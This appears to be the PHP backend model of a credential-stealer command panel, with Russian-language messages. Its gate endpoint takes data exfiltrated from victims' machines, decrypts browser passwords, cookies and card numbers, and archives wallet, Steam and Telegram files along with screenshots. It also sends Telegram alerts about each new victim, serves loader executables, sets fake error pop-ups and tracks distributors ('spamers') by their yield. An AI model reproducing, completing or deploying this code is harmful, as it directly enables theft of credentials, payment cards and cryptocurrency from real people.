<?php
namespace application\models;
use application\core\Model;
use application\core\View;
use application\lib\Answer;
use application\lib\TelegramService;
use \R;

class Main extends Model {

    public function loader($name) {
        $filename = "application/files/loader/" . basename($name) . ".exe";
        if(file_exists($filename))
            echo file_get_contents($filename);
    }

    public function telegram($data) {
        $data = json_decode($data, true);

        if($data->message != null) {
            $chat_id = $data["chat"]["id"];
            $username = $data["chat"]["username"];

            $user = R::findOne("accounts", "telegram = ?", [$username]);
            if($user != null) {
                $tel = current($user->ownTelegramsList);
                if($tel != null) {
                    $telegram = new TelegramService($tel->token);
                    $tel->chatid = $chat_id;

                    R::store($user);

                    // if /start...
                    $telegram->sendMessage($chat_id, "Бот сохранен, теперь вы можете использовать его");
                }
            }
            else {
                $telegram->sendMessage($chat_id, "Ваш аккаунт не привязан к панели. Если вы являетесь владельцем аккаунта, укажите ваш логин в настройках бота на сайте");
            }
        }
    }

    public function install($hostname, $db_name, $db_login, $db_password, $user_login, $user_pass) {
        R::setup( 'mysql:host='.$hostname.";dbname=".$db_name, $db_login, $db_password);
        if(!R::testConnection()) {
            return new Answer(false, "Невозможно подключиться к БД");
        }

        // Alternative creation...

        $acc = R::findOne("accounts", "login = ?", [$user_login]);
        if($acc == null) {
            $acc = R::dispense("accounts");
            $acc->login = $user_login;
        }
        $acc->password = password_hash($user_pass, PASSWORD_DEFAULT);
        $acc->date = time();
        $acc->fa = 0;
        $acc->send = 0;
        $acc->admin = 1;
        $acc->sng = 0;

        $config = R::dispense('configs');

        $config->name = "test";
        $config->path = "test";
        $config->formats = json_encode(['*']);
        $config->size = 1.0;
        $config->recursive = "true";
        $config->rc = 2;

        $acc->ownConfigsList[] = $config;


        $log = R::dispense('logs');

        $log->checked = 0;
        $log->file = "file";
        $log->ip = "address";
        $log->country = "COUNTRY";
        $log->code = "CODE";
        $log->user = "username";
        $log->pc = "pc";
        $log->tag = "tag";
        $log->version = "version";
        $log->size = "1000000";
        $log->date = time();
        $log->hwid = "hwid";
        $log->windows = "windows version";
        $log->spamer = "spamer";


        $log->passwords = 0;
        $log->cookies = 0;
        $log->forms = 0;
        $log->cards = 0;
        $log->wallets = 0;

        $log->steam = 1;
        $log->telegram = 1;

        $log->new = 1;

        $acc->ownLogsList[] = $log;

        $pass = R::dispense("passwords");

        $pass->url = "url";
        $pass->login = "login";
        $pass->password = "password";
        $pass->browser = "browser";

        $log->ownPasswordsList[] = $pass;

        R::store($log);


        $spamer = R::dispense("spamers");

        $spamer->login = "login";
        $spamer->hash = "hash";
        $spamer->date = time();

        $acc->ownSpamersList[] = $spamer;

        $tag = R::dispense('tags');

        $tag->name = "name";
        $tag->key = "key";

        $acc->ownTagsList[] = $tag;


        $err = R::dispense("errors");

        $err->use = 1;
        $err->text = "text";
        $err->title = "title";
        $err->type = 1;

        $acc->ownErrorsList[] = $err;

        $tel = R::dispense('telegrams');

        $tel->token = "token";
        $tel->username = "username";
        $tel->chatid = "chatid";

        $acc->ownTelegramsList[] = $tel;


        $dd = R::dispense('dd');

        $dd->domain = "domain";
        $dd->type = 1;

        $acc->ownDdList[] = $dd;

        $loader = R::dispense('loaders');

        $loader->name = "name";
        $loader->filename = "filename";

        $acc->ownLoadersList[] = $loader;


        R::store($acc);

        R::trash($dd);
        R::trash($tel);
        R::trash($err);
        R::trash($tag);
        R::trash($spamer);
        R::trash($pass);
        R::trash($log);
        R::trash($config);
        R::trash($loader);


        $configVal = "<?php

return [
    'host' => '".$hostname."',
    'dbname' => '".$db_name."',
    'user' => '".$db_login."',
    'password' => '".$db_password."',
];";

        $config = fopen("application/config/db.php", 'w+');
        if($config != false) {
            fwrite($config, $configVal);
            fclose($config);
        }
        else {
            return new Answer(false, "Не удалось создать файл конфигурации: ".error_get_last()['message']);
        }
        

        // Autorize user...
        $this->sign_in($user_login, $user_pass);
        
        return new Answer();
    }

    public function check_token($token) {
        $spamer = R::findOne("spamers", "hash = ?", [$token]);

        if($spamer != null)
            return new Answer();
        else
            return new Answer(false, "Запрашиваемый токен не найден");
    }

    public function delete_spamer($id) {
        $spamer = current($this->user->withCondition('id = ?', [$id])->ownSpamersList);

        if($spamer != null) {
            foreach($this->user->withCondition('spamer = ?', [$spamer->hash])->ownLogsList as $log)
                $log->spamer = null;

            R::store($this->user);
            R::trash($spamer);

            return new Answer();
        }
        else
            return new Answer(false, "Выбраный вами спамер не найден");
    }

    public function get_spamers_activity() {
        $end = strtotime('now');
        $result = [];


        foreach($this->user->ownSpamersList as $spamer) {
            $data = [];
            for($i = 7; $i >= 0; $i--) {
                $month_name = strtoupper(date('M', strtotime("first day of -".$i." months", time())));

                $count = $this->user->withCondition("FROM_UNIXTIME(date) < LAST_DAY(NOW() - INTERVAL ? MONTH) AND FROM_UNIXTIME(date) > LAST_DAY(NOW() - INTERVAL ? MONTH) AND spamer = ?", [$i, $i + 1, $spamer->hash])->countOwn('logs');

                $data[] = [
                    "month" => $month_name,
                    "logs" => $count,
                ];
            }

            $result[] = [
                "spamer" => $spamer->login,
                "data" => $data,
            ];
        }

        
        return $result;
    }

    public function edit_spamer($o_login, $n_login) {
        $spamer = current($this->user->withCondition('login = ?', [$o_login])->ownSpamersList);

        if($spamer != null) {
            $spamer->login = $n_login;

            R::store($this->user);
            return new Answer();
        }
        else {
            return new Answer(false, "Выбраный вами спамер не найден");
        }
    }

    public function all_spamers_info() {
        $result = [];

        foreach($this->user->ownSpamersList as $spamer) {
            $spamer_logs = $this->user->withCondition('spamer = ?', [$spamer->hash])->countOwn('logs');

            $result[] = [
                "id" => $spamer->id,
                "login" => $spamer->login,
                "logs" => $spamer_logs,
                "hash" => $spamer->hash,
                "date" => date("Y-m-d H:i:s", $spamer->date),
            ];
        }

        return $result;
    }
    
    public function add_spamer($login) {
        $spamer = current($this->user->withCondition('login = ?', [$login])->ownSpamersList);
        if($spamer == null) {
            $spamer = R::dispense('spamers');

            $spamer->login = $login;
            $spamer->hash = md5($login.date("Y-m-d H:i:s"));
            $spamer->date = time();

            $this->user->ownSpamersList[] = $spamer;
            R::store($this->user);

            return new Answer();
        }
        else
            return new Answer(false, "Спамер с указаным логином уже существует");
    }

    public function get_spamers_stat_table() {
        $result = [];

        foreach($this->user->ownSpamersList as $spamer) {
            $passwords = 0;
            $cookies = 0;
            $cards = 0;
            $forms = 0;

            $logs_count = $this->user->withCondition("spamer = ?", [$spamer->hash])->countOwn('logs');

            foreach($this->user->withCondition("spamer = ?", [$spamer->hash])->ownLogsList as $log) {
                $passwords += $log->passwords;
                $cookies += $log->cookies;
                $cards += $log->cards;
                $forms += $log->forms;
            }

            $result[] = [
                "login" => $spamer->login,
                "logs" => $logs_count,
                "data" => [
                    $logs_count!=0?round($passwords / $logs_count, 2):0,
                    $logs_count!=0?round($cookies / $logs_count, 2):0,
                    $logs_count!=0?round($cards / $logs_count, 2):0,
                    $logs_count!=0?round($forms / $logs_count, 2):0,
                ],
            ];
        }

        return ["data" => $result];
    }

    public function get_spamers_table() {
        $result = [];

        foreach($this->user->ownSpamersList as $spamer) {
            $result[] = [
                "actions" => [ $spamer->id, $spamer->login ],
                "login" => $spamer->login,
                "hash" => $spamer->hash,
            ];
        }

        return ["data" => $result];
    }

    public function netscape($text) {
        $cookies = array();
 
        $lines = explode("\n", $text);
     
        foreach ($lines as $line) {
            if (isset($line[0]) && substr_count($line, "\t") == 6) {
                $tokens = explode("\t", $line);
                $tokens = array_map('trim', $tokens);
     
                $cookie = array();
                $cookie['domain'] = $tokens[0];
                $cookie['flag'] = (bool)$tokens[1];
                $cookie['path'] = $tokens[2];
                $cookie['secure'] = (bool)$tokens[3];

                $cookie['expiration'] = date('Y-m-d h:i:s', $tokens[4]);
     
                $cookie['name'] = $tokens[5];
                $cookie['value'] = $tokens[6];
     
                $cookies[] = $cookie;
            }
        }
     
        return $cookies;
    }

    public function gate_check($id, $ip, $hwid) {
        $hwid = (string)md5(strtolower($hwid));
        $user = R::findOne("accounts", "id = ?", [$id]);
        if($user != null) {
            $last_logs = $user->with('ORDER BY date DESC LIMIT 3')->ownLogsList;
            if($last_logs != []) {
                foreach($last_logs as $log) {
                    if($log->ip == $ip || $log->hwid == $hwid) {
                        return false;
                    }
                }
            }

            if($user->sng == 1) {
                $ip_data = $this->GetIpData($_SERVER["REMOTE_ADDR"]);

                $sng_codes = [
                    "az", "am", "by", "kz", "kg", "md", "ru", "tj", "uz", "ua", 
                ];

                foreach($sng_codes as $code)
                    if($code == $ip_data['code'])
                        return false;
            }
        }
        else {
            return false;
        }
        return true;
    }

    public function gate($data) {
        $zip = new \ZipArchive;

        $ip_data = $this->GetIpData($_SERVER["REMOTE_ADDR"]);

        $country_code = $ip_data['code'];
        $archiveName = $country_code."_".$_SERVER["REMOTE_ADDR"]."_".date("YmdHis", time());
        $archive = 'application/files/stealler/'.$archiveName.".zip";
        $user = R::findOne("accounts", "id = ?", [$data["id"]]);
        $hwid = (string)md5(strtolower($data["hwid"]));

        if ($zip->open($archive, \ZipArchive::CREATE) === TRUE) {

            $delete_files_list = [];
            $cookies_domains = [];
            $passwords_arr = [];

            $forms_count = 0;
            $cards_count = 0;
            $wallets_count = 0;

            $steam_exists = false;
            $telegram_exists = false;

            $password_str = "";
            if(!empty($data["browser"])) {
                foreach ($data["browser"] as $name => $browser) {
                    if($browser["aes_key"] != "") {
                        $aes_password = base64_decode($browser["aes_key"]);
                    }

                    if(!empty($browser["passwords"])) {
                        foreach ($browser["passwords"] as $pass) {
                            if($pass["is_encrypted"] == "1") {
                                $password = $this->DecryptAES($aes_password, $pass["password"]);
                            }
                            else {
                                $password = $pass["password"];
                            }

                            $password_str .= "URL: ".$pass["url"]."\r\n"."LOGIN: ".$pass["login"]."\r\n"."PASSWORD: ".$password."\r\n"."BROWSER: ".$name."\r\n\r\n";
                            
                            $passwords_arr[] = [
                                "url" => $pass["url"],
                                "login" => $pass["login"],
                                "password" => $password,
                                "browser" => $name,
                            ];
                        }
                    }
                    if(!empty($browser["cookies"])) {
                        $cookies_str = "";
                        foreach ($browser["cookies"] as $cookie) {
                            if($cookie["is_encrypted"] == "1") {
                                $value = $this->DecryptAES($aes_password, $cookie["value"]);
                            }
                            else {
                                $value = $cookie["value"];
                            }

                            $host = mb_strtolower($cookie["domain"]);
                            // delete point in start
                            $host = strpos($host, '.')===0?substr($host, 1):$host;
                            // delete www. in start
                            $host = strpos($host, 'www.')===0?substr($host, 4):$host;

                            if(in_array($host, $cookies_domains) == false)
                                $cookies_domains[] = $host;

                            $cookies_str .= $cookie["domain"]."\t".$cookie["flag"]."\t".$cookie["path"]."\t".$cookie["secure"]."\t".$cookie["expiration"]."\t".$cookie["name"]."\t".$value."\r\n";
                        }
                        $zip->addFromString("Cookies/".$name.".txt", $cookies_str);
                    }
                    if(!empty($browser["cards"])) {
                        $cards_str = "";
                        foreach ($browser["cards"] as $card) {
                            if($card["is_encrypted"] == "1") {
                                $value = $this->DecryptAES($aes_password, $card["number"]);
                            }
                            else {
                                $value = $card["number"];
                            }
                            $cards_str .= "NUMBER: ".$value."\r\n"."NAME: ".$card["name"]."\r\n"."DATE: ".$card["date"]."\r\n\r\n";
                            $cards_count++;
                        }
                        $zip->addFromString("Credit Cards/".$name.".txt", $cards_str);
                    }
                    if(!empty($browser["forms"])) {
                        $forms_str = "";
                        foreach ($browser["forms"] as $form) {
                            $forms_str .= "NAME: ".$form["name"]."\r\n"."VALUE: ".$form["value"]."\r\n\r\n";
                            $forms_count++;
                        }
                        $zip->addFromString("Autofills/".$name.".txt", $forms_str);
                    }
                    if(!empty($browser["histories"])) {
                        $history_str = "";
                        foreach ($browser["histories"] as $history) {
                            $history_str .= $history["url"]."\r\n"."(".$history["title"].")"."\r\n\r\n";
                        }
                        $zip->addFromString("Histories/".$name.".txt", $history_str);
                    }
                }
            }
            

            $delete_files_list[] = $this->DownloadFile($_FILES["screenshot"]["tmp_name"], "screen.png");

            if(file_exists($delete_files_list[count($delete_files_list) - 1])) {
                copy($delete_files_list[count($delete_files_list) - 1], "application/files/screenshots/".$archiveName.".png");
            }

            $zip->addFile($delete_files_list[count($delete_files_list) - 1], "Screenshot.png");
            $zip->addFromString("Passwords.txt", $password_str);

            $zip->addFromString("Info.txt", $data["sys_data"]);

            if(!empty($_FILES["config"])) {
                foreach ($_FILES["config"]["tmp_name"] as $config_name => $tmp_names) {
                    foreach($tmp_names as $local_path => $tmp_name) {
                        $path = "Config/".$config_name."/".$local_path;

                        $delete_files_list[] = $this->DownloadFile($tmp_name, basename($local_path));
                        $zip->addFile($delete_files_list[count($delete_files_list) - 1], $path);
                    }
                }
            }

            if(!empty($_FILES["wallets"])) {
                foreach ($_FILES["wallets"]["tmp_name"] as $wallet_name => $tmp_names) {
                    foreach($tmp_names as $local_path => $tmp_name) {
                        $path = "Wallets/".$wallet_name."/".$local_path;

                        $delete_files_list[] = $this->DownloadFile($tmp_name, basename($local_path));
                        $zip->addFile($delete_files_list[count($delete_files_list) - 1], $path);

                    }
                    $wallets_count++;
                }
            }

            if(!empty($_FILES["steam"])) {
                foreach ($_FILES["steam"]["tmp_name"] as $name => $tmp_name) {
                    $path = "Steam/".$name;
                    $steam_exists = true;

                    $delete_files_list[] = $this->DownloadFile($tmp_name, $name);
                    $zip->addFile($delete_files_list[count($delete_files_list) - 1], $path);
                }
            }

            if(!empty($_FILES["telegram"])) {
                foreach ($_FILES["telegram"]["tmp_name"] as $name => $tmp_name) {
                    $path = "Telegram/".$name;
                    $telegram_exists = true;

                    $delete_files_list[] = $this->DownloadFile($tmp_name, basename($name));
                    $zip->addFile($delete_files_list[count($delete_files_list) - 1], $path);
                }
            }

            $zip->close();

            foreach($delete_files_list as $file) {
                unlink($file);
            }

            $db_log = R::findOne("logs", "hwid = ?", [$hwid]);
            if($db_log == null)
                $db_log = R::dispense("logs");
            else {
                unlink('application/files/stealler/'.$db_log->file.'.zip');
            }

            $db_log->file = $archiveName;
            $db_log->ip = $_SERVER["REMOTE_ADDR"];

            $db_log->country = $ip_data["country"];
            $db_log->code = $ip_data["code"];

            $db_log->user = $data["username"];
            $db_log->pc = $data["pc"];
            $db_log->tag = $data["tag"];
            $db_log->version = $data["version"];
            $db_log->size = filesize($archive);
            $db_log->date = time();
            $db_log->hwid = $hwid;
            $db_log->windows = $data["windows"];
            $db_log->spamer = $data["spamerhash"];


            $db_log->passwords = count($passwords_arr);
            $db_log->cookies = count($cookies_domains);
            $db_log->forms = $forms_count;
            $db_log->cards = $cards_count;
            $db_log->wallets = $wallets_count;

            $db_log->steam = $steam_exists;
            $db_log->telegram = $telegram_exists;

            $db_log->new = 1;

            $fp = fopen('application/files/cookies/' . $archiveName . '.txt', 'w');
            if($fp !== false) {
                $str = "";

                foreach($cookies_domains as $domain)
                    $str .= $domain . "\r\n";

                fwrite($fp, $str);
            }
            fclose($fp);

            foreach($passwords_arr as $pass) {
                $db_pass = R::dispense('passwords');

                $db_pass->url = $pass["url"];
                $db_pass->login = $pass["login"];
                $db_pass->password = $pass["password"];
                $db_pass->browser = $pass["browser"];

                $db_log->ownPasswordsList[] = $db_pass;
            }

            $user->ownLogsList[] = $db_log;
            R::store($user);


            if($user->send == 1) {
                $tel = current($user->ownTelegramsList);
                if($tel != null && $tel->chatid != null) {

                    $spamer = current($user->withCondition("hash = ?", [$data["spamerhash"]])->ownSpamersList);
                    $spamer_name = $spamer == null ? "-" : $spamer->login;

                    $tag = current($user->withCondition("key = ?", [$data["tag"]])->ownTagsList);
                    $tag_name = $tag == null ? "-" : $tag->name;

                    $msg = "<b>Новый лог!</b>" . "\n" .
                            "Из: " . $country_code . "(" . $_SERVER["REMOTE_ADDR"] . ")". "\n\n" .
                            "Паролей: " . $passwords_count . "\n" .
                            "Кукисов: " . $cookies_count . "\n" .
                            "Карт: " . $cards_count . "\n" .
                            "Форм: " . $forms_count . "\n" .
                            "Телеграм: " . ($telegram_exists?"есть":"нет") . "\n" .
                            "Стим: " . ($steam_exists?"есть":"нет") . "\n\n" . 
                            "Спамер: " . $spamer_name . "\n" .
                            "Тэг: " . $tag_name;

                    $service = new TelegramService($tel->token);
                    $service->sendMessage($tel->chatid, $msg, true);
                }
            }
        }
    }

    private function DownloadFile($file, $name) {
        if(is_uploaded_file($file)) {
            $dest = "application/temp/".$name;
            if(move_uploaded_file($file, $dest)) {
                return $dest;
            }
        }
    }

    private function DecryptAES($master_password, $data) {
        $encryptedData = base64_decode($data);
        $nonce = substr($encryptedData, 3, 12);
        $blob = substr($encryptedData, 15);
        $data_len = strlen($blob) - 16;

        $tag = substr($blob, $data_len);
        $data = substr($blob, 0, $data_len);

        return openssl_decrypt($data, 'aes-256-gcm', $master_password, OPENSSL_RAW_DATA, $nonce, $tag);
    }


    public function sign_in($username, $password, $fa = "") {
        $user = R::findOne("accounts", "login = ?", [$username]);
        if($user != null) {
            if(password_verify($password, $user->password)) {
                $tel = current($user->ownTelegramsList);

                if($user->fa != 0 && $tel->chatid != null && $tel->token != null && $fa == null) {
                    $telegram = new TelegramService($tel->token);
                    $code = rand(100000, 1000000);

                    $user->fa_code = $code;
                    R::store($user);

                    $telegram->sendMessage($tel->chatid, "Код для входа в аккаунт: <b>" . $code . "</b>. Если это были не вы, срочно смените пароль в панели!", true);

                    return new Answer(false, "Требуется 2FA код", ["use_fa" => true]);
                }
                else if($fa != "") {
                    if($fa == $user->fa_code) {
                        $hash = md5($user->login."=>".$user->password."=>".$user->fa_code);
                        $_SESSION["user"] = $hash;

                        setcookie("auth", $hash, time()+60*60*24*30, '/');
                        setcookie("session_id", $user->id, time()+60*60*24*30, '/');
                        
                        return new Answer();
                    }
                    else {
                        return new Answer(false, "Код неверный, повторите попытку");
                    }
                }
                else {
                    $hash = md5($username."=>".$user->password);
                    $_SESSION["user"] = $hash;
                    setcookie("auth", $hash, time()+60*60*24*30, '/');
                    setcookie("session_id", $user->id, time()+60*60*24*30, '/');
                    
                    return new Answer();
                }
            }
        }
        return new Answer(false, "Неверное имя пользователя или пароль");
    }

    public function config($id) {
        $user = R::load("accounts", $id);
        if($user->id == 0)
            return "";

        $configs = [];
        foreach ($user->ownConfigsList as $config) {            
            $configs[] = [
                "name" => $config->name,
                "path" => $config->path,
                "size" => (float)($config->size),
                "recursive" => $config->recursive=="true",
                "rc" => (int)($config->rc==null?0:$config->rc),
                "formats" => json_decode($config->formats),
            ];
        }


        $answer = array();
        $error = current($user->ownErrorsList);
        $loaders = [];
        $loaders_sites = [];

        foreach($user->ownLoadersList as $loader)
            $loaders[] = $loader->filename;


        if($error->use == 1) {
            $useError = true;
            $fake_text = $error->text;
            $fake_header = $error->title;
            $fake_type = $error->type;
        }
        else {
            $useError = false;
            $fake_text = null;
            $fake_header = null;
            $fake_type = null;
        }

        if($useError) {
            $answer = [
                "fake" => 
                [
                    "text" => $fake_text,
                    "header" => $fake_header,
                    "type" => $fake_type,
                ],
            ];
        }
        $answer = array_merge($answer, [
            "dirs" => $configs,
            "loaders" => $loaders,
        ]); 

        return $answer;
    }
}